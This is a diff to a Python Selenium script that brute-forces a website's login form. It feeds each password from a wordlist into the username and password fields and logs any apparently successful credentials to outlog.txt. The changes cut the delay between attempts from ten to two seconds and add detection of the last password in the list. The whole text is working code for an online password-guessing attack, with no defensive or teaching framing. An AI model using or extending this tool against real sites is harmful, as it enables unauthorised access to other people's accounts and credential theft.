@@ -15,17 +15,7 @@ from selenium.common.exceptions import NoSuchElementException
 parser = OptionParser()
 now = datetime.datetime.now()
 
-print(sys.version)
-
-# Colors
-class color:
-   BLUE = '\033[94m'
-   GREEN = '\033[92m'
-   YELLOW = '\033[93m'
-   RED = '\033[91m'
-   BOLD = '\033[1m'
-   UNDERLINE = '\033[4m'
-   CWHITE  = '\33[37m'
+print (sys.version)
 
 #Args
 parser.add_option("-u", "--username", dest="username",help="Choose the username")
@@ -81,10 +71,11 @@ def wizard():
 
 def starter(username, user_log, user_pas, sel_login, pass_list, website):
     passlist = open(pass_list, 'r')
+    readinglines = open(pass_list, 'r').readlines()
+    lastline = readinglines[-1]
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
-    count = 1 # counterStrike )))))
     browser = webdriver.Chrome(CHROME_DVR_DIR)
     while True:
         try:
@@ -97,18 +88,27 @@ def starter(username, user_log, user_pas, sel_login, pass_list, website):
 
                 Selector_u.send_keys(username)
                 Selector_p.send_keys(line)
-                t.sleep(10)
+                t.sleep(2)
                 print ("----====--=+=--====----")
-                print (color.GREEN + 'Tried password: ' + color.RED + line + color.GREEN + "\nFor user: " + color.RED + username)
+                print ('Tried password: ' + line + "\nFor user: " + username)
                 print ("----====--=+=--====----")
                 temp = line
+                if (temp == lastline):
+                    enter.click()
+                    print("Last attempt may be guessed [?!]")
+                    print("Have fun :)")
+                    f = open('outlog.txt', 'a+')
+                    f.write('=============\nLogin: ' + username + "\nMaybe :) Password: " + temp + "=============\n")
+                    exit()
         except KeyboardInterrupt:
             print ("User used Ctrl+C to exit...")
             exit()
         except selenium.common.exceptions.NoSuchElementException:
             print ('THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
             print ('LAST PASS ATTEMPT BELLOW')
-            print (color.GREEN + 'Password has been found: ' + temp)
+            print ('Password has been found: ' + temp)
+            f = open('outlog.txt', 'a+')
+            f.write('=============\nLogin: ' + username + "\nPassword: " + temp + "=============\n")
             exit()
 
 wizard()
